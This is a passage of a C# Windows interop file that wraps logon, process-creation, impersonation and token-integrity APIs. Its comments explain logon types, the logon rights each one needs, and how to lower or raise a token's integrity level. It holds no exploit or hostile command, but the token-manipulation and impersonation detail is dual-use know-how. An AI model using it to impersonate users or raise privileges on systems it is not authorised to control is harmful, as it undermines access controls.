        /// However, for LOGON32_LOGON_NETWORK this does NOT return a Primary Token (TokenPrimary: 1) and instead its an Impersonation Token (TokenImpersonation: 2) that you CANNOT use in CreateProcessAsUser unless you call DuplicateTokenEx to convert the impersonation token to a primary token.
        /// 
        /// This logon occurs when you access remote file shares or printers.
        /// This logon type is intended for high performance servers to authenticate plaintext passwords. The LogonUserExExW function does not cache credentials for this logon type.
        /// 
        /// Requires                SeNetworkLogonRight Logon Right - Granted to BUILTIN\Users
        /// Unless included in      SeDenyNetworkLogonRight - For BUILTIN\Guests
        /// </summary>
        Network,

        /// <summary>
        /// 4 - LOGON32_LOGON_BATCH - If the user is an Admin (Added to BUILTIN\Administrators group), and UAC is on, then
        ///                           This logon type will result in a High IL and High-Privilege token (elevated token) when UAC is on AND the user is contained within BUILTIN\Administrators... unlike Interactive resulting in a privilege-stripped (filtered) token.
        ///                           The reason for this (I suspect) would be because of its intention to logon users through background means, where no interaction is meant to occur (such as in a different session)
        ///                           "This logon type is intended for batch servers, where processes may be executing on behalf of a user without their direct intervention. This type is also for higher performance servers that process many plaintext authentication attempts at a time, such as mail or web servers. The LogonUserExExW function does not cache credentials for this logon type."
        /// 
        /// Used for scheduled tasks. When the Windows Scheduler service starts a scheduled task, it first creates a new logon session for the task, so that it can run in the security context of the account that was specified when the task was created.
        /// 
        /// Requires                SeBatchLogonRight     - Granted to BUILTIN\Administrators, Backup Operators, Performance Log Users
        /// Unless included in      SeDenyBatchLogonRight - BUILTIN\Guests
        /// </summary>
        Batch,

        /// <summary>
        /// 5 - LOGON32_LOGON_SERVICE - Used for service accounts that are log on (such as when starting a service, for being run under a specific service account)
        /// When a service starts, Windows first creates a logon session for the user account that is specified in the service configuration.
        /// 
        /// When specifying a user for a service within services.msc, then services.msc will add that user to the SeServiceLogonRight LSA User Right Assignment
        /// so that it can log on. If it is ever removed, then the service will fail to start mentioning a logon failure, even if the user and PW are correct.
        /// 
        /// Requires        SeServiceLogonRight     -  4x different accounts in the 'IIS APPPOOL' domain, 
        ///                                            NT SERVICE\TrustedInstaller, NT SERVICE\ALL SERVICES and many other NT SERVICE 
        ///                                            The domain machine account: [JoinedDomain]\[CompName]$, NT AUTHORITY\SYSTEM, NT AUTHORITY\NETWORK SERVICE
        /// Unless in       SeDenyServiceLogonRight - BUILTIN\Guests
        /// </summary>
        Service = 5,

        /// <summary>
        /// 6 - Not supported. LogonUser will show Parameter Incorrect
        /// </summary>
        //NA_Proxy,

        /// <summary>
        /// 7 - LOGON32_LOGON_UNLOCK - used whenever you unlock your Windows machine
        /// This logon type is for GINA DLLs that log on users who will be interactively using the computer. This logon type can generate a unique audit record that shows when the workstation was unlocked.
        /// 
        /// (No Logon Rights required or deniable)
        /// </summary>
        Unlock = 7,

        /// <summary>
        /// 8 - LOGON32_LOGON_NETWORK_CLEARTEXT - This is used when you log on over a network and the password is sent in clear text. 
        /// This happens, for example, when you use basic authentication to authenticate to an IIS server.
        /// 
        /// "This logon type preserves the name and password in the authentication package, which allows the server to make connections to other network servers while impersonating the client."
        /// " A server can accept plaintext credentials from a client, call LogonUserExExW, verify that the user can access the system across the network, and still communicate with other servers."
        /// 
        /// (No Logon Rights required or deniable)
        /// </summary>
        NetworkCleartext,

        /// <summary>
        /// 9 - LOGON32_LOGON_NEW_CREDENTIALS - used when you run an application using the RunAs command and specify the /netonly switch. 
        /// When you start a program with RunAs using /netonly, the program starts in a new logon session that has the same local identity (this is the identity of the user you are currently logged on with), but uses different credentials (the ones specified in the runas command) for other network connections. 
        /// Without /netonly, Windows runs the program on the local computer and on the network as the user specified in the runas command, and logs the logon event with type 2 (Interactive)
        /// 
        /// "This logon type allows the caller to clone its current token and specify new credentials for outbound connections. The new logon session has the same local identifier but uses different credentials for other network connections."
        /// "This logon type is supported only by the LOGON32_PROVIDER_WINNT50 ("Negotiate") logon provider."
        /// 
        /// 
        /// LogonUser + LOGON32_LOGON_NEW_CREDENTIALS, What is this flag used for?
        /// https://docs.microsoft.com/en-us/archive/blogs/winsdk/logonuser-logon32_logon_new_credentials-what-is-this-flag-used-for
        ///         A new flag was introduced in Windows VISTA for LogonUser(), LOGON32_LOGON_NEW_CREDENTIALS. 
        ///         ...
        ///         ...
        ///         
        /// </summary>
        NewCredentials,

        /// <summary>
        /// 10 - RDP (Terminal Services) and Remote Assistance logon
        /// 
        /// Requires        SeRemoteInteractiveLogonRight Logon Right - BUILTIN\Remote Desktop Users, BUILTIN\Administrators, [JoinedDomain]\[RDP Support Group]
        /// Unless in       SeDenyRemoteInteractiveLogonRight
        /// </summary>
        RemoteInteractive_RDP,

        /// <summary>
        /// 11 - This is logged when users log on using cached credentials, which basically means that in the absence of a domain controller, you can still log on to your local machine using your domain credentials. 
        /// Windows supports logon using cached credentials to ease the life of mobile users and users who are often disconnected.
        /// 
        /// </summary>
        CachedInteractive,

        /// <summary>
        /// 12 - (Same as RemoteInteractive, this is used internally for auditing purpose)
        /// </summary>
        CachedRemoteInteractive_SameAsRemoteInteractive,

        /// <summary>
        /// 13 - Cached Unlock workstation
        /// </summary>
        CachedUnlock
    }


    /// <summary>
    /// Provider = Authentication package
    /// </summary>
    public enum LogonProvider_LogonUser
    {
        /// <summary>
        /// Use the standard logon provider for the system. 
        ///     - The default security provider is "Negotiate" (LOGON32_PROVIDER_WINNT50), 
        ///       UNLESS you pass NULL for the domain name and the user name is not in UPN format. In this case, the default provider is "NTLM" (LOGON32_PROVIDER_WINNT40)
        /// 
        /// LogonUser - docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera
        ///         
        /// </summary>
        LOGON32_PROVIDER_DEFAULT = 0,

        /// <summary>
        /// TBD
        /// </summary>
        LOGON32_PROVIDER_WINNT35 = 1,

        /// <summary>
        /// Use the "NTLM" logon provider.
        /// </summary>
        LOGON32_PROVIDER_WINNT40 = 2,

        /// <summary>
        /// Use the "Negotiate" logon provider.  (selects between "NTLM" and "Kerberos")
        /// </summary>
        LOGON32_PROVIDER_WINNT50 = 3
    }



    #endregion

    #region CreateProcess APIs & Structs

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithLogonW
    (
        string userName,
        string domain,
        string password,
        uint logonFlags,
        string applicationName,
        string commandLine,
        uint creationFlags,
        IntPtr environment,
        string currentDirectory,
        ref STARTUPINFO_W startupInfo,                      // Unicode-specific STARTUPINFO
        out PROCESS_INFORMATION processInformation
    );

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]            // Strings will be marshaled as unicode strings for unicode-specific APIs (CreateProcessWithLogonW and CreateProcessWithTokenW)
    public struct STARTUPINFO_W
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }


    // Custom Enums from:
    // http://stackoverflow.com/questions/16686122/calling-createprocess-from-powershell

    [Flags]
    public enum CreationFlags : int
    {
        NONE = 0,
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
    }


    #endregion

    #region Token Integrity setting

    /// <summary>
    /// Sets the integrity level of the supplied access token. 
    /// NOTICE: This requires Access Right TOKEN_ADJUST_DEFAULT
    /// </summary>
    public static bool SetTokenIntegrityLevel(IntPtr token, IntegrityLevel integrity)
    {
        // Test note: 5-11-19
        //      This can instantly the IL of a process's Token to any IL lower (like what PH can do), simply by Opening the process and Opening the Token handle, without calling DuplicateTokenEx.
        //      [Tested from a High IL process lowering itself to a Medium IL with all privileges removed.]
        //      However, it will NOT work to wait the IL (which PH prevents from even attempting as well) -- TBD what the error returned is from SetTokenInformation
        //      
        //      To raise the IL, a copy of the token must FIRST be obtained via DuplicateTokenEx (Still will be Impersonation Level = SecurityIdentification; Type = Primary).
        //              DuplicateTokenEx(hToken, SU.MAXIMUM_ALLOWED, IntPtr.Zero, (int)SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, (int)TOKEN_TYPE.TokenPrimary, out hTokenCopy);
        //              Can now change the hTokenCopy to a higher IL. Just cannot assign to an existing process, must create another one via CPAU (which requires the AssignPrimary). Primary tokens = Tokens for processes.
        //      Then on the copy of the token this method will be called to set the IL to a higher point (in which case it will then work)
        //      But this operation on the copy of the token will require TCB Privilege: SE_TCB_NAME Privilege must be present AND enabled (tested 3-19-18 from a High IL process) within the calling thread's or process token
        //      

        // This code was originally from here: (with a lot more of great example code such as SetFileMandatoryLabel)
        // github.com/rcarz/fusion/blob/master/libfusion/Security.cs

        bool ret = false;

        if (token == IntPtr.Zero)
        {
            Status("SetTokenIntegrityLevel was called with a NULL (IntPtr.Zero) token handle. Returning false.");
            return false;
        }

        SID_IDENTIFIER_AUTHORITY authoritySid = new SID_IDENTIFIER_AUTHORITY()
        {
            Value = MANDATORY_LABEL_AUTHORITY
        };

        TOKEN_MANDATORY_LABEL tokenLabel = new TOKEN_MANDATORY_LABEL();
        IntPtr pLabelAuthorityStruct;
        IntPtr pSID;
        IntPtr pLabel;
        int labelSize;
        int errno = 0;

        pLabelAuthorityStruct = Marshal.AllocHGlobal(Marshal.SizeOf(authoritySid));
        Marshal.StructureToPtr(authoritySid, pLabelAuthorityStruct, false);

        bool success = AllocateAndInitializeSid(pLabelAuthorityStruct, 1, (int)integrity, 0, 0, 0, 0, 0, 0, 0, out pSID);
        if (!success)
        {
            errno = Marshal.GetLastWin32Error();
            Status("Failed to allocate new SID with AllocateAndInitializeSid for integrity: " + integrity.ToString(), GetLastErrorInfo());
            ret = false;
        }
        else
        {
            tokenLabel.Label.pSID = pSID;
            tokenLabel.Label.Attributes = TokenGroupAttributes.SE_GROUP_INTEGRITY;

            labelSize = Marshal.SizeOf(tokenLabel);
            pLabel = Marshal.AllocHGlobal(labelSize);
            Marshal.StructureToPtr(tokenLabel, pLabel, false);

            success = SetTokenInformation(token, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pLabel, labelSize);
            if (!success)
            {
                errno = Marshal.GetLastWin32Error();
                Status("Failed to set the token's Integrity Level (mandatory label) using SetTokenInformation w/ TokenIntegrityLevel. Set attempt: " + integrity.ToString(), GetLastErrorInfo());
                ret = false;
            }
            else
            {
                // Successful
                ret = true;
            }

            Marshal.FreeHGlobal(pLabel);
            Marshal.FreeHGlobal(pSID);
        }

        Marshal.FreeHGlobal(pLabelAuthorityStruct);

        return ret;
    }



    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength);


    /// <summary>
    /// Windows mandatory integrity levels (Mandatory Labels)
    /// </summary>
    public enum IntegrityLevel : int
    {
        Same = -2,
        Unknown = -1,
        Untrusted = SECURITY_MANDATORY_UNTRUSTED_RID,
        Low = SECURITY_MANDATORY_LOW_RID,
        Medium = SECURITY_MANDATORY_MEDIUM_RID,
        High = SECURITY_MANDATORY_HIGH_RID,
        System = SECURITY_MANDATORY_SYSTEM_RID,
        ProtectedProcess = SECURITY_MANDATORY_PROTECTED_PROCESS_RID
    }

    // TOKEN_MANDATORY_LABEL structure
    // msdn.microsoft.com/en-us/library/windows/desktop/bb394727(v=vs.85).aspx
    //
    //      typedef struct _TOKEN_MANDATORY_LABEL {
    //           SID_AND_ATTRIBUTES Label;
    //      } TOKEN_MANDATORY_LABEL, *PTOKEN_MANDATORY_LABEL;

    public static readonly byte[] MANDATORY_LABEL_AUTHORITY = new byte[] { 0, 0, 0, 0, 0, 16 };

    // Mandatory Label SIDs (integrity levels)
    private const int SECURITY_MANDATORY_UNTRUSTED_RID = 0;
    private const int SECURITY_MANDATORY_LOW_RID = 0x1000;
    private const int SECURITY_MANDATORY_MEDIUM_RID = 0x2000;
    private const int SECURITY_MANDATORY_HIGH_RID = 0x3000;
    private const int SECURITY_MANDATORY_SYSTEM_RID = 0x4000;
    private const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x5000;

    // From: github.com/rcarz/fusion/blob/master/libfusion/Security.cs
    //      (lots more here including ACE and DACL, with File Integrity
    //
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AllocateAndInitializeSid(IntPtr pIdentifierAuthority,
        byte nSubAuthorityCount, int dwSubAuthority0, int dwSubAuthority1,
        int dwSubAuthority2, int dwSubAuthority3, int dwSubAuthority4, int dwSubAuthority5,
        int dwSubAuthority6, int dwSubAuthority7, out IntPtr pSid);

    [StructLayout(LayoutKind.Sequential)]
    public struct SID_IDENTIFIER_AUTHORITY
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
        public byte[] Value;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_MANDATORY_LABEL
    {
        public SID_AND_ATTRIBUTES Label;
    };

    /// <summary>
    /// NOTICE: DO NOT add Pack = 1 here for NtCreateToken and LsaLogonUser to operate
    /// 
    /// For TOKEN_GROUPS (which contains an array of SID_AND_ATTRIBUTES) to operate correctly under x64 for NtCreateToken or LsaLogonUser it is REQUIRED that Pack = 1 is NOT added to the structure unlike TOKEN_PRIVILEGES_Ptr.
    ///    This was discovered from testing.
    ///    The SID_AND_ATTRIBUTES structure will otherwise have a size of(sizeOfEachElement within InitStructureArrayContiguous) an incorrect value of 12, instead of an expected 16, where NtCreateToken and LsaLogonUser will fail with:
    ///    LsaLogonUser - System.AccessViolationException: 'Attempted to read or write protected memory. This is often an indication that other memory is corrupt.'
    ///    NtCreateToken - "Error: 998, 0x3E6: ERROR_NOACCESS: Invalid access to memory location"
    ///    Could be related to
    ///    blogs.msdn.microsoft.com/oldnewthing/20040826-00/?p=38043
    ///
    ///    So basically do NOT add Pack = 1 unless absolutely neccessary with testing the API calls first without.
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES
    {
        public IntPtr pSID;

        /// <summary>
        /// Context specific attributes
        /// For TokenGroups token information see TokenGroupAttributes
        /// </summary>
        public TokenGroupAttributes Attributes;
    }

    /// <summary>
    /// Attributes members of the SID_AND_ATTRIBUTES structures, such as for From TOKEN_GROUPS:     msdn.microsoft.com/en-us/library/windows/desktop/aa379624(v=vs.85).aspx
    /// These attributes indicate what the specified group (pSID in SID_AND_ATTRIBUTES) indicates
    /// 
    /// Descriptions: 
    /// GROUP_USERS_INFO_1 :            docs.microsoft.com/en-us/windows/desktop/api/lmaccess/ns-lmaccess-_group_users_info_1
    /// TOKEN_GROUPS_AND_PRIVILEGES     docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-_token_groups_and_privileges
    /// 
    /// </summary>
    public enum TokenGroupAttributes : uint
    {
        Disabled = 0,                               // Just don't add SE_GROUP_ENABLED. NOTE: Don't test/check for this Disabled flag, as it will always return true for HasFlag

        /// <summary>
        /// The group/SID is mandatory, and CANNOT be disabled:
        /// 
        /// docs.microsoft.com/en-us/windows/desktop/secauthz/sid-attributes-in-an-access-token
        /// You cannot disable a group SID that has the SE_GROUP_MANDATORY attribute. You cannot use AdjustTokenGroups to disable the user SID of an access token.
        /// </summary>
        SE_GROUP_MANDATORY = 1,

        /// <summary>
        /// The group is enabled for access checks by default.
        /// </summary>
        SE_GROUP_ENABLED_BY_DEFAULT = 0x2,

        /// <summary>
        /// The group/SID is enabled for access checks.
        ///     When the system performs an access check, it checks for access-allowed and access-denied access control entries (ACEs) that apply to the SID.
        ///     A SID without this attribute is ignored during an access check unless the SE_GROUP_USE_FOR_DENY_ONLY attribute is set.
        /// </summary>
        SE_GROUP_ENABLED = 0x4,

        /// <summary>
        /// The SID identifies a group account for which the user of the token is the owner of the group, or the SID can be assigned as the owner of the token or objects.
        /// </summary>
        SE_GROUP_OWNER = 0x8,                        // Owner pSID Group name

        /// <summary>
        /// For Deny Purposes. (When this attribute is set, the SE_GROUP_ENABLED attribute must not be set.)
        /// 
        /// "SID Attributes in an Access Token"
        /// docs.microsoft.com/en-us/windows/desktop/secauthz/sid-attributes-in-an-access-token
        ///     CreateRestrictedToken can apply the SE_GROUP_USE_FOR_DENY_ONLY attribute to any SID, including the user SID and group SIDs that have the SE_GROUP_MANDATORY attribute. 
        ///     However, you cannot remove the deny-only attribute from a SID, nor can you use AdjustTokenGroups to set the SE_GROUP_ENABLED attribute on a deny-only SID.
        ///  
        /// </summary>
        SE_GROUP_USE_FOR_DENY_ONLY = 0x10,

        /// <summary>
        /// A mandatory integrity SID.      (Mandatory = Cannot be modified)
        /// </summary>
        SE_GROUP_INTEGRITY = 0x20,

        /// <summary>
        /// Group is enabled for integrity level.
        /// </summary>
        SE_GROUP_INTEGRITY_ENABLED = 0x40,

        /// <summary>
        /// The SID identifies a domain-local group.
        /// </summary>
        SE_GROUP_RESOURCE = 0x20000000,

        /// <summary>
        /// The group/SID is used to identify a logon session associated with an access token.
        /// </summary>
        SE_GROUP_LOGON_ID = 0xC0000000               // The specified pSID Group name is the Logon SID
    }

    #endregion

    #region Token Info Class values - TOKEN_INFORMATION_CLASS


    // Token information and layout - "How Access Tokens Work"
    //      technet.microsoft.com/en-us/library/cc783557(v=ws.10).aspx
    //      (descriptions added from here)
    //
    // This enum if from the .NET Sourcecode:
    // http://referencesource.microsoft.com/#System.ServiceModel/System/ServiceModel/Activation/ListenerUnsafeNativeMethods.cs

    public enum TOKEN_INFORMATION_CLASS : int
    {
        /// <summary>
        /// The SID for the user’s account. If the user logs on to an account on the local computer, the user’s SID is taken from the account database maintained by the local Security Accounts Manager (SAM). If the user logs on to a domain account, the SID is taken from the Object-SID property of the User object in Active Directory.
        /// </summary>
        TokenUser = 1,              // TOKEN_USER structure that contains the user account of the token. = 1, 

        /// <summary>
        ///A list of SIDs for security groups that include the user. The list also includes SIDs from the SID-History property of the User object representing the user’s account in Active Directory.
        /// </summary>
        TokenGroups,                // a TOKEN_GROUPS structure that contains the group accounts associated with the token., 

        /// <summary>
        /// A list of privileges held on the local computer by the user and by the user’s security groups.
        /// </summary>
        TokenPrivileges,            // a TOKEN_PRIVILEGES structure that contains the privileges of the token., 

        /// <summary>
        /// AKA Default Owner - The SID for the user or security group who, by default, becomes the owner of any object that the user either creates or takes ownership of.
        /// </summary>
        TokenOwner,                 // a TOKEN_OWNER structure that contains the default owner security identifier (SID) for newly created objects., 

        /// <summary>
        /// The SID for the user’s primary security group. This information is used only by the POSIX subsystem and is ignored by the rest of Windows Server 2003.
        /// </summary>
        TokenPrimaryGroup,          // a TOKEN_PRIMARY_GROUP structure that contains the default primary group SID for newly created objects., 


        /// <summary>
        /// A built-in set of permissions that the operating system applies to objects created by the user if no other access control information is available. The default DACL grants Full Control to Creator Owner and System.
        /// </summary>
        TokenDefaultDacl,           // a TOKEN_DEFAULT_DACL structure that contains the default DACL for newly created objects., 

        /// <summary>
        /// The process that caused the access token to be created, such as Session Manager, LAN Manager, or Remote Procedure Call (RPC) Server.
        /// </summary>
        TokenSource,                // a TOKEN_SOURCE structure that contains the source of the token. TOKEN_QUERY_SOURCE access is needed to retrieve this information., 

        /// <summary>
        /// A value indicating whether the access token is a primary or impersonation token.
        /// </summary>
        /// 
        TokenType,                  // a TOKEN_TYPE value that indicates whether the token is a primary or impersonation token., 

        /// <summary>
        /// A value that indicates to what extent a service can adopt the security context of a client represented by this access token.
        /// </summary>
        TokenImpersonationLevel,    // a SECURITY_IMPERSONATION_LEVEL value that indicates the impersonation level of the token. If the access token is not an impersonation token, the function fails., 

        /// <summary>
        /// Information about the access token itself. The operating system uses this information internally.
        /// </summary>
        TokenStatistics,            // a TOKEN_STATISTICS structure that contains various token statistics., 

        /// <summary>
        /// An optional list of SIDs added to an access token by a process with authority to create a restricted token. Restricting SIDs can limit a thread’s access to a level lower than what the user is allowed.
        /// </summary>
        TokenRestrictedSids,        // a TOKEN_GROUPS structure that contains the list of restricting SIDs in a restricted token., 

        /// <summary>
        /// AKA TS Session ID - A value that indicates whether the access token is associated with the Terminal Services client session.
        /// </summary>
        TokenSessionId,             // a DWORD value that indicates the Terminal Services session identifier that is associated with the token. If the token is associated with the Terminal Server console session, the session identifier is zero. If the token is associated with the Terminal Server client session, the session identifier is nonzero. In a non-Terminal Services environment, the session identifier is zero. If TokenSessionId is set with SetTokenInformation, the application must have the Act As Part Of the Operating System privilege, and the application must be enabled to set the session ID in a token.


        TokenGroupsAndPrivileges,   // a TOKEN_GROUPS_AND_PRIVILEGES structure that contains the user SID, the group accounts, the restricted SIDs, and the authentication ID associated with the token., 

        /// <summary>
        /// Reserved for internal use.
        /// </summary>
        TokenSessionReference,      // Reserved,

        /// <summary>
        /// Nonzero if the token includes the SANDBOX_INERT flag.
        /// </summary>
        TokenSandBoxInert,          // a DWORD value that is nonzero if the token includes the SANDBOX_INERT flag., 

        /// <summary>
        /// Since Windows Server 2003, used for per user auditing.
        /// </summary>
        TokenAuditPolicy,

        /// <summary>
        /// Introduced with Windows Server 2003. If the token resulted from a logon using explicit credentials, then the token will contain the ID of the logon session that created it. If the token resulted from network authentication, then this value will be zero.
        /// </summary>
        TokenOrigin,                // a TOKEN_ORIGIN value. If the token  resulted from a logon that used explicit credentials, such as passing a user, domain, and password to the  LogonUser function, then the TOKEN_ORIGIN structure will contain the ID of the logon session that created it. If the token resulted from  network authentication, such as a call to AcceptSecurityContext  or a call to LogonUser with dwLogonType set to LOGON32_LOGON_NETWORK or LOGON32_LOGON_NETWORK_CLEARTEXT, then this value will be zero.

        ///
        // Looks like these below have been Vista+ since the creation of UAC (these are not shown in the "How Access Tokens Work" article which applies only to Server 2003 and earlier)
        //

        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid,


        //
        // Looks like these have been added since Windows 8 and Modern UI apps (UWA)
        //

        TokenIsAppContainer,
        TokenCapabilities,
        TokenAppContainerSid,
        TokenAppContainerNumber,
        TokenUserClaimAttributes,
        TokenDeviceClaimAttributes,
        TokenRestrictedUserClaimAttributes,
        TokenRestrictedDeviceClaimAttributes,
        TokenDeviceGroups,
        TokenRestrictedDeviceGroups,


        MaxTokenInfoClass           // MaxTokenInfoClass should always be the last enum  
    }

    #endregion

    #region Process & Thread APIs

    /// <summary>
    /// Enable the calling thread to have a token (impersonate) the token supplied (such as that from a different process, or a higher level)
    /// Must have SeImpersonaePrivilege at least AVAILABLE in your process token to have this succeed, otherwise: ERROR_PRIVIEGE_NOT_HELD
    /// </summary>
    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    /// <summary>
    /// Undo the ImpersonateLoggedOnUser call
    /// </summary>
    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int GetCurrentProcessId();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentThread();

    #endregion

    #region WOW64 disabling method

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);

    [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool IsWow64Process(
        [In] IntPtr hProcess,
        [Out] out bool wow64Process
    );

    static IntPtr wow64TogglePointer = new IntPtr();

    /// <summary>
    /// Stops path redirection if this is an x86 process
    /// </summary>
    public static bool StopWow64Redirection(bool stop)
    {
        if (stop)
        {
            return Wow64DisableWow64FsRedirection(ref wow64TogglePointer);
        }
        else
        {
            return Wow64RevertWow64FsRedirection(wow64TogglePointer);
        }
    }

    #endregion

    #endregion
}
